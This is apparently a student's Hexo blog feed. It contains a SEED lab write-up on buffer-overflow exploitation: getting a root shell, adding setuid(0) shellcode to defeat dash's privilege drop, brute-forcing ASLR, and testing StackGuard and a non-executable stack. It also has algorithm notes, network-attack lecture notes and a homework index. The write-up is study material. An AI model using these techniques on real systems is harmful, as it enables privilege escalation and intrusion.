<h4 id="2-7-Task-6：对64-bit程序实施攻击-Level-4"><a href="#2-7-Task-6：对64-bit程序实施攻击-Level-4" class="headerlink" title="2.7 Task 6：对64-bit程序实施攻击 (Level 4)"></a><strong>2.7 Task 6</strong>：对64-bit程序实施攻击 (Level 4)</h4><p>​    这里还是对64-bit程序进行攻击，但是这里的缓冲区大小只有10，这就给了我们挑战，我们无法将恶意代码填入eip之前即设置的缓冲区中，所以我们应该考虑其它做法，这里由于str也存在栈中，因此可以给ret返回地址一个足够大的偏移，使它能找到str位置，让恶意代码执行。我们在badfile中放置大量的nop指令，也就是将恶意代码放置在str尾部，增加猜测成功概率。(gdb要调试到strcpy位置获取str的地址)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192801244.png" alt="image-20230105192801244" style="zoom:80%;" /></p>
<p>​    这里ret是buffer位置偏移1500字节，然后我们执行代码，发现获取了root shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192824520.png" alt="image-20230105192824520"></p>
<h4 id="2-8-Task-7：攻破dash的保护"><a href="#2-8-Task-7：攻破dash的保护" class="headerlink" title="2.8 Task 7：攻破dash的保护"></a><strong>2.8 Task 7</strong>：攻破dash的保护</h4><p>前置知识：</p>
<p>1、实际用户ID和实际用户组ID：标识我是谁，身份的识别，谁运行的程序。也就是登录用户的uid和gid，比如我的Linux以simon登录，在Linux运行的所有的命令的实际用户ID都是simon的uid，实际用户组ID都是simon的gid（可以用id命令查看）。</p>
<p>2、有效用户ID和有效用户组ID：进程用来决定我们对资源的访问权限，权利的识别。一般情况下，有效用户ID等于实际用户ID，有效用户组ID等于实际用户组ID。当设置（SUID）位，则有效用户ID等于文件的所有者的uid。</p>
<p>  当 Ubuntu 操作系统中的 dash shell 检测到有效 UID 不同于真实 UID 时（Set-UID 程序中），就会 主动放弃特权。这是通过将有效 UID 修改为真实 UID 来实现的，本质上就是放弃特权。在前面的任务中， 我们让/bin/sh 指向了另一种没有这种保护机制的 zsh shell。在本任务中，我们让/bin/sh 指向原来 的/bin/dash 并攻破这种保护机制。请执行以下操作，让/bin/sh 指向/bin/dash：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192845823.png" alt="image-20230105192845823" style="zoom:67%;" /></p>
<p>​    将 call_shellcode.c 编译为以 root 为所有者的二进制文件（通过输入”make setuid” 命令）下面在不调用setuid(0)的情况下运行可执行文件，可以发现shel环境的用户是seed，并没有获取文件所有者的权限。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192914244.png" alt="image-20230105192914244" style="zoom: 80%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192921054.png" alt="image-20230105192921054" style="zoom:80%;" /></p>
<p>​    然后我们将setuid(0)的代码加入到shellcode，执行程序，这里可以发现在这种情况下真实用户和有效用户均为root，此时便是获得了一个真正的root进程。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192943620.png" alt="image-20230105192943620" style="zoom: 80%;" /></p>
<p>​    更新shellcode加入setuid(0)的内同，运行漏洞程序，发现获取了root shell，且现在使用的是安全shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193026916.png" alt="image-20230105193026916"></p>
<h4 id="2-9-Task-8：攻破地址随机化"><a href="#2-9-Task-8：攻破地址随机化" class="headerlink" title="2.9 Task 8：攻破地址随机化"></a><strong>2.9 Task 8</strong>：攻破地址随机化</h4><p>​    在 32-bit Linux 机器上，栈的可用熵为 19 比特，意味着栈的基地址有 2^19= 524, 288 种可能性。这个 数字并不是很大，可以很容易地使用暴力方法穷举。这里首先创建一个run.sh的脚本文件，然后在/bin/dash下执行脚本，我们可以发现在尝试了4237次后获取了root shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193047195.png" alt="image-20230105193047195"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193053812.png" alt="image-20230105193053812"></p>
<h4 id="2-10-Task-9：测试其他保护机制"><a href="#2-10-Task-9：测试其他保护机制" class="headerlink" title="2.10 Task 9：测试其他保护机制"></a><strong>2.10 Task 9</strong>：测试其他保护机制</h4><p>  <strong>2.10.1 Task 9.a:打开StackGuard保护机制</strong></p>
<p>  首先，在 StackGuard 安全机制关闭的情况下重复 Level-1 攻击，确保攻击仍然可以成功。然后我们关闭地址随机化，对stack.c进行编译（gcc 默认启动Stackguard），这时候我们执行程序，可以发现得到提示stack smashing deteced，<br> 也就是说，构造的缓冲区溢出攻击程序被检测出来，导致程序终止，无法攻击成功。缓冲区溢出，导致覆盖了ebp旁边的canary表指，而canary就是用来保护函数的返回地址的。</p>
<p>在更改返回地址的时候，需要用nop覆盖了返回地址之前的数据，也就覆盖了canary的值，而canary的值又是随机的，因此，很容易检查出缓冲区溢出。</p>
<p>​                               <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193142783.png" alt="image-20230105193142783"></p>
<p><strong>2.10.2 Task 9.b:**</strong>打开不可执行栈保护机制**</p>
<p>​    测试不可执行栈，我们这里更改makefile文件，然后将栈设置为不可执行，运行代码，可以发现出现了Segmentation fault，也就是说栈上恶意代码无法被执行，出现程序崩溃。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193152584.png" alt="image-20230105193152584"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105193158648.png" alt="image-20230105193158648"></p>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Design and Analysis Algoritm5</title>
    <url>/2023/01/16/algorithm5/</url>
    <content><![CDATA[<h1 id="Divide-and-Conquer-II"><a href="#Divide-and-Conquer-II" class="headerlink" title="Divide-and-Conquer (II)"></a>Divide-and-Conquer (II)</h1><h3 id="1-快速幂-指数算法"><a href="#1-快速幂-指数算法" class="headerlink" title="1.快速幂/指数算法"></a>1.快速幂/指数算法</h3><p>这里可以使用分治来实现，也就是一半一半这样计算</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116194227144.png" alt="image-20230116194227144"></p>
<p>复杂度分析，这里可以使用master theory来求解</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116194320973.png" alt="image-20230116194320973"></p>
<h5 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h5><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116194335595.png" alt="image-20230116194335595"></p>
<h5 id="迭代实现"><a href="#迭代实现" class="headerlink" title="迭代实现"></a>迭代实现</h5><p>这里可以将指数写成二进制形式，当指数位是1就乘上底数</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116195102034.png" alt="image-20230116195102034"></p>
<p>计算斐波那契额数列的传统方法我们都知道，是不断进行连续的递归，时间复杂度为$\Theta(n)$,那么有没有更好的算法呢</p>
<p>通过观察可以知道$F_n$是$F_{n-1}$和$F_{n-2}$的线性组合，这刺激我们可以使用线性代数来表达递归关系</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116195505587.png" alt="image-20230116195505587"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116195534745.png" alt="image-20230116195534745"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116195623269.png" alt="image-20230116195623269"></p>
<p>这里可以使用对角化来加速运算，对角化以后对矩阵的乘方只需要对对角线元素乘方</p>
<p><a href="https://zhuanlan.zhihu.com/p/493567724">https://zhuanlan.zhihu.com/p/493567724</a></p>
<h3 id="2-整数乘法"><a href="#2-整数乘法" class="headerlink" title="2.整数乘法"></a>2.整数乘法</h3><p>整数的加减法没啥说的，就是二进制形式用小学的加减法就好，easy</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116201636826.png" alt="image-20230116201636826"></p>
<p>但是乘法的话可能需要n2了</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116201713371.png" alt="image-20230116201713371"></p>
<h5 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h5><p>将整数写成左右两个部分，然后使用移位运算给它分开，不过这样貌似也不是很高效，使用主定理一求推导方程 还是n2</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116201936828.png" alt="image-20230116201936828"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116201948284.png" alt="image-20230116201948284"></p>
<h5 id="Gauss尝试"><a href="#Gauss尝试" class="headerlink" title="Gauss尝试"></a>Gauss尝试</h5><p>高斯发现了复数乘法的一些规则</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116202117924.png" alt="image-20230116202117924"></p>
<h5 id="Karatsuba"><a href="#Karatsuba" class="headerlink" title="Karatsuba"></a>Karatsuba</h5><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116202306715.png" alt="image-20230116202306715"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116202335644.png" alt="image-20230116202335644"></p>
<h3 id="3-矩阵乘法"><a href="#3-矩阵乘法" class="headerlink" title="3.矩阵乘法"></a>3.矩阵乘法</h3><p>对于两个向量的内部乘法来说，都是对应位置相乘然后再相加，对于小学我们学到的算法来说是渐进最优的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116202948005.png" alt="image-20230116202948005"></p>
<p>矩阵乘法，对于最终$n^2$元素的结果矩阵来说，每一个元素位置的结果都是一行乘一列也就是n次相乘，因此总时间复杂度是$n^3$,好像并不是最优的</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116203128951.png" alt="image-20230116203128951"></p>
<p>使用分治算法来优化首先 想到的是使用矩阵分块乘法的方式，但是这样貌似并没有改变复杂度</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116203300260.png" alt="image-20230116203300260"></p>
<p>如何突破:</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116203736720.png" alt="image-20230116203736720"></p>
<p>这里定义18个相关的矩阵，最终只需要7次递归运算即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116203909599.png" alt="image-20230116203909599"></p>
<h3 id="4-多项式乘法"><a href="#4-多项式乘法" class="headerlink" title="4.多项式乘法"></a>4.多项式乘法</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116205809599.png" alt="image-20230116205809599"></p>
<p>这里加法就是对应位置相加，计算多项式的值共有三种算法，一种是一个一个计算，另一种是用cache将x的多次方记录下来，或者使用Horner算法</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116205959414.png" alt="image-20230116205959414"></p>
<p>代数的基本原理：一个具有n-1个复数系数的多项式有n个复数根</p>
<p>推论：一个n-1次多项式由其在n个不同的x值上求值唯一确定</p>
<p>计算上也就是使用拉格朗日插值定理</p>
<p><a href="https://www.zhihu.com/question/58333118">(1 封私信 / 12 条消息) 如何直观地理解拉格朗日插值法？ - 知乎 (zhihu.com)</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116210749426.png" alt="image-20230116210749426"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116210821594.png" alt="image-20230116210821594"></p>
<p>系数到点的值之间的转化是唯一的，一个d次的多项式选择d+1个点，然后计算对用的y值，之前我们分析过多项式求值的复杂度为$\Theta(n)$,那么这里的计算就是$\Theta(n^2)$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117111526115.png" alt="image-20230117111526115"></p>
<p>给出n个点求系数</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117111546605.png" alt="image-20230117111546605"></p>
<p>如何来加速上述过程呢，对于像$y=x^2$这样的偶函数来说，我们可以选择对称点对这样当我们知道其中一侧的值时，另一侧的值也会知道</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117115021740.png" alt="image-20230117115021740"></p>
<p>当形如$y=x^3$这样的函数时，只需要在一半求值变换符号即可</p>
<p>那么当是一个多次的多项式时，这里就可以分别提取偶次和奇次</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117115348826.png" alt="image-20230117115348826"></p>
<p>这样将奇次和偶次提取，并且将奇次再转换为偶次，就可以在计算一对相反数函数值时只计算其中一个，并且将两部分看作$x^2$的函数，提升计算效率。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117115909223.png" alt="image-20230117115909223"></p>
<p>这样的话就将子问题的规模减半了，然后根据递推方程就可以求出时间复杂度</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117120757331.png" alt="image-20230117120757331"></p>
<p>但是这里由一个问题，我们注意到对两个子问题而言，每个求值点都是平方数，都是正的，递归不成立，所以能不能将新的求值点也变成相反数对，这里就是FFT天才之处，用一些复数来变化    </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117190733836.png" alt="image-20230117190733836"></p>
<p>我们可以使用逆推的方法来求各个值</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117193634661.png" alt="image-20230117193634661"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117200523292.png" alt="image-20230117200523292"  /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117201311749.png" alt="image-20230117201311749"></p>
<p>这里使用傅里叶矩阵进行运算</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117201423421.png" alt="image-20230117201423421"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202034306.png" alt="image-20230117202034306"></p>
<p>算法步骤如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202133800.png" alt="image-20230117202133800"></p>
<p>上面的FFT完成了系数表示到点表示的转换，下面DFT算法将完成点表示到系数表示的转化</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202516202.png" alt="image-20230117202516202"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202633573.png" alt="image-20230117202633573"></p>
<p>而反向的逆运算可以仅仅做如下调整就可以实现，这看上去是不可能的，但是这其实可以使用线性代数进行解决</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202816889.png" alt="image-20230117202816889"></p>
<p>在线性代数的角度，实际上是运算了傅里叶矩阵的逆矩阵$F_n(w)^{-1}$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117202947030.png" alt="image-20230117202947030"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117203002950.png" alt="image-20230117203002950"></p>
<p>其实关键的一点是矩阵$G_n$和$F_n$之间的转换，上面已经做了表示</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117203812875.png" alt="image-20230117203812875"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117204542253.png" alt="image-20230117204542253"></p>
<p>这里可以看到只有对角线上的元素$k=k’$,最终乘出来就是对角线为1的E矩阵，可以使用下面的方法应用矩阵</p>
<ul>
<li>$w^{-1}=e^{-2\pi i/n}$ 作为单位的n个根</li>
<li>将$<a_0,\dots,a_{n-1}>$and$<y_0,\dots,y_{n-1}>$</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117204937513.png" alt="image-20230117204937513"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117204957168.png" alt="image-20230117204957168"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117205704910.png" alt="image-20230117205704910"></p>
<p>分治算法的概念</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117210647565.png" alt="image-20230117210647565"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117210658962.png" alt="image-20230117210658962"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230117210724015.png" alt="image-20230117210724015"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/12/08/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<p>在搭建过程中遇到了gitee图床检查referer header来防止外链访问的问题，不得不说还是GitHub好用，使用CDN加速后基本没区别。</p>
]]></content>
  </entry>
  <entry>
    <title>Network Security(二)</title>
    <url>/2023/01/27/network1/</url>
    <content><![CDATA[<h3 id="Network-Security-一"><a href="#Network-Security-一" class="headerlink" title="Network Security(一)"></a>Network Security(一)</h3><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><h4 id="一、常见攻击方法"><a href="#一、常见攻击方法" class="headerlink" title="一、常见攻击方法"></a>一、常见攻击方法</h4><h5 id="1-硬件地址欺骗"><a href="#1-硬件地址欺骗" class="headerlink" title="1.硬件地址欺骗"></a>1.硬件地址欺骗</h5><p>（1）攻击者能力：访问物理网络</p>
<p>（2）攻击流程：产生具有src硬件地址的数据包，但这个地址并不是发送设备的源地址，但这个地址并不是发送设备的源地址，通常这个非法地址与网络上另一台设备的地址相同</p>
<p>(3)不可跨网络，因为路由器会重写硬件地址，攻击者的数据包目标地址可以为网络中某一台主机的地址，以形成欺骗，或者与任何设备地址都不匹配，引起交换机出现问题或者引起大量流量</p>
<h5 id="2-网络嗅探"><a href="#2-网络嗅探" class="headerlink" title="2.网络嗅探"></a>2.网络嗅探</h5><p>（1）访问物理网络</p>
<p>（2）攻击流程：网络访问控制器用于将设备连接到网络介质上，并设置为混杂模式，在网络上捕捉目标地址不是本设备硬件地址的数据包</p>
<h5 id="3-物理方法"><a href="#3-物理方法" class="headerlink" title="3.物理方法"></a>3.物理方法</h5><p>网络设备的物理破坏，分为偶然的和故意的</p>
<h5 id="4-网络监管"><a href="#4-网络监管" class="headerlink" title="4.网络监管"></a>4.网络监管</h5><p>1.交换机支持生成树端口或者镜像端口，所有数据的副本都发送到这个端口，，但是会产生速度问题，因为镜像端口并不能达到这么快的速度</p>
<p>2.使用带交换器的集线器，还有速度问题</p>
<p>3.使用网络捕捉器，插入流量经过的线路并做副本</p>
<h4 id="二、有线网络协议"><a href="#二、有线网络协议" class="headerlink" title="二、有线网络协议"></a>二、有线网络协议</h4><p>LAN：局域网 WAN：广域网</p>
<p>1.以太网协议</p>
<p>（1）功能：<font color='blue'>提供一种方式对共享介质的访问，对所有连接到同样的共享介质的设备同等的访问.</font></p>
<p>（2）CDMA/CD:载波侦听多路访问/冲突检测，以太网使用的协议，用于管理对共享介质的访问</p>
<p>（3）以太网交换机：每一台设备和交换机之间形成一个独立的以太网，以太网交换机维护每一台设备的硬件地址表，地址表与交换机的每一个端口相关，收到数据后，如果目标地址与表中的地址匹配，则数据包被发送到对应端口的设备；如果目标地址和表中地址不匹配，则数据包被发送到每一个端口的每一台设备</p>
<font color='red'>交换机和网桥不能隔离冲突域，而路由器可以隔离广播域</font>



<h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><h5 id="1-基于头部的攻击"><a href="#1-基于头部的攻击" class="headerlink" title="1.基于头部的攻击"></a>1.基于头部的攻击</h5><p>1.目标地址修改为广播地址，增加流量</p>
<p>2.修改源地址使交换机混乱</p>
<p>3.把源地址和目的地址设置为一样，使交换机产生问题</p>
<p>4.产生长度过短（小于46）或者长度过长的数据包</p>
<h5 id="2-基于协议的攻击"><a href="#2-基于协议的攻击" class="headerlink" title="2.基于协议的攻击"></a>2.基于协议的攻击</h5><p>有线以太网协议很简单，主要是由硬件实现.<font color='blue'>没有任何基于协议的漏洞，唯一基于协议的漏洞是设备是否与CDMA/CD协议有冲突</font></p>
<h5 id="3-基于验证的攻击"><a href="#3-基于验证的攻击" class="headerlink" title="3.基于验证的攻击"></a>3.基于验证的攻击</h5><p>硬件地址可以用来验证网络上的设备</p>
<font color ='blue'>ARP是中毒：ARP是IP层协议，用于确定目标设备的硬件的地址，攻击者嗅探交换环境中两台主机之间的所有流量，利用ARP协议无状态的特性，未经请求的答复将会被接受，进而会毒害受害者主机的ARP缓存</font>

<p>敌手能力：必须 访问物理网络</p>
<p>减灾方法：</p>
<p>1.使用物理网络层加密协议</p>
<p>2.网络访问 控制，确保有效的计算机可以访问网络</p>
<h5 id="4-基于流量的攻击"><a href="#4-基于流量的攻击" class="headerlink" title="4.基于流量的攻击"></a>4.基于流量的攻击</h5><p>1.<font color='blue'>嗅探：将以太网硬件控制器设置为混杂模式，进而读取与硬件地址无关的所有流量</font></p>
<p>敌手能力：访问物理网络</p>
<p>减灾方法:</p>
<p>1.采用交换式网络，也就是一个端口只有一台设备</p>
<p>2.VLAN虚拟局域网，将流量隔离在虚拟网络</p>
<p>3.使用加密方法</p>
<p>2.<font color='blue'>通过设置目标地址为广播地址，用大量的流量造成网络崩溃</font></p>
<p>敌手能力:访问物理网络</p>
<p>减灾方法：没有有效的方法</p>
<h4 id="三、无线网络协议"><a href="#三、无线网络协议" class="headerlink" title="三、无线网络协议"></a>三、无线网络协议</h4><ul>
<li>访问接入点（AP），功能产生无线网络，并管理对网络的访问，提供对有线网络的访问</li>
<li>服务装置识别（SSID）：AP使用的名字，用于识别网络</li>
<li>无线设备使用 CSMA/CA 载波监听多路访问/冲突避免和AP通信</li>
<li>两种类型1.通过AP来延申网络，将无线设备看起来和有线设备一致 2.AP作为路由器的一部分，产生两个独立的硬件地址域</li>
</ul>
<h5 id="1-基于头部的攻击-1"><a href="#1-基于头部的攻击-1" class="headerlink" title="1.基于头部的攻击"></a>1.基于头部的攻击</h5><font color='blue'>1.设置目的地址为广播地址，导致流量过多</font>

<font color='blue'>2.拒绝服务攻击，非法的头部信息导致访问丢失</font>

<p>减灾方法：由于很难阻止设备传输信号，且无线网络允许任何人访问数据包，所以很难控制</p>
<h5 id="2-基于协议的攻击-1"><a href="#2-基于协议的攻击-1" class="headerlink" title="2.基于协议的攻击"></a>2.基于协议的攻击</h5><p>1.对CSMA/CA协议发起攻击，由于设备处于被攻击状态，会导致对网络的拒绝服务攻击</p>
<p>减灾很难，可以通过忽略协议以干扰信号</p>
<p>2.钓鱼：伪装合法AP，并广播其SSID</p>
<p>减灾方法：1.关闭SSID的广播 2.使用加密或网络访问控制</p>
<font color='blue'>探测者还可以看到AP，但AP被标记为了已加密，如果探测者想使用已加密的AP，则攻击转化为基于验证的攻击，加密也可以减少基于流量的攻击</font>

<h5 id="3-基于验证的攻击-1"><a href="#3-基于验证的攻击-1" class="headerlink" title="3.基于验证的攻击"></a>3.基于验证的攻击</h5><p>无线网络验证</p>
<ul>
<li>设备验证   1.访问验证点验证—-是不是一个有效AP，是恶意访问接入点还是非法访问接入点 2.无线设备验证</li>
<li>访问接入点配置验证：攻击者企图访问指定AP的配置菜单，试图修改AP的网络安全特性</li>
</ul>
<p>访问接入点验证攻击</p>
<ul>
<li>恶意AP：(Rogue Access Point)有效的网络用户安装了一台AP，但不告知单位,为攻击者提供了内部网络的访问渠道</li>
<li>非法AP:(Fake Access Point)攻击者安装了一台AP，并伪装成有效AP</li>
</ul>
<p>减灾：</p>
<ol>
<li>使用网络访问控制NAC</li>
<li>扫描无线信号寻找恶意AP，也可以寻找SSID广播信息</li>
</ol>
<font color='blue'>非法AP：如果攻击对象是一个不加密相对比较容易</font>

<h5 id="4-基于流量的攻击-1"><a href="#4-基于流量的攻击-1" class="headerlink" title="4.基于流量的攻击"></a>4.基于流量的攻击</h5><p>（1）嗅探：访问物理网络，而且把网络访问控制器设置混杂模式(promiscuous）</p>
<p>减灾：使用加密手段</p>
<p>导致mitm和帧注入攻击，就是嗅探网络中的数据包，伪装成legitimate接入点对数据包进行截获</p>
<p>(2)广播报文可能导致雪崩效应</p>
<p>加密手段:</p>
<ul>
<li>WEP:有线对等私钥协议：<font color='orange'>提供简单的加密和验证，通过共享的密钥来加密数据帧</font></li>
<li>WPA：（WIFI Protected Access）提供加密和验证，使用共享密钥进行验证，使用会话密钥进行加密</li>
<li><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230128104727442.png" alt="image-20230128104727442"></li>
</ul>
<h4 id="四、对策"><a href="#四、对策" class="headerlink" title="四、对策"></a>四、对策</h4><ul>
<li>控制广播域</li>
<li>使用WEP或者WPA</li>
<li>禁用SSID广播</li>
<li>改变默认AP设置</li>
<li>不选择有描述性SSID</li>
<li>限制和MAC地址的关联</li>
</ul>
<p>VLAN：网络隔离，将广播的流量限制在有限区域</p>
<font color='green'>两种方法：</font>

<ul>
<li>静态方式：基于固定的端口划分</li>
<li>动态方式：基于硬件地址MAC划分</li>
</ul>
<p>安全性</p>
<ul>
<li>隔离流量，但不会在同一网络中其他设备下保护网络内的设备</li>
<li>动态VLAN可以通过修改MAC地址进而被欺骗</li>
<li>能够帮助无线安全</li>
</ul>
<p>NAC Framework</p>
<p>网络访问控制也就是验证网络上的每一台设备，而不仅仅是用户</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>innovation</title>
    <url>/2023/05/04/innovation/</url>
    <content><![CDATA[<h1 id="Innovation-practice-homework"><a href="#Innovation-practice-homework" class="headerlink" title="Innovation-practice-homework"></a>Innovation-practice-homework</h1><p>The repository uses for the homework.</p>
<h3 id="小组成员"><a href="#小组成员" class="headerlink" title="小组成员"></a>小组成员</h3><p>sdu lzq</p>
<h3 id="项目汇总"><a href="#项目汇总" class="headerlink" title="项目汇总"></a>项目汇总</h3><p>项目后面给出了对应说明和代码的repo名称和地址</p>
<h5 id="已完成project"><a href="#已完成project" class="headerlink" title="已完成project"></a>已完成project</h5><p>1.implement the naïve birthday attack of reduced SM3</p>
<blockquote>
<font color=green>**SM3_birthday_attack**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/SM3_birthday_attack">Innovation-practice-homework/SM3_birthday_attack at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
<p>2.implement the Rho method of reduced SM3</p>
<blockquote>
<font color=green >**implenment the Rho sm3**</font>

<p><a href="https://github.com/sdu-lzq/Innovation-practice-homework/tree/main/implenment the Rho sm3">Innovation-practice-homework/implenment the Rho sm3 at main · sdu-lzq/Innovation-practice-homework (github.com)</a></p>
</blockquote>
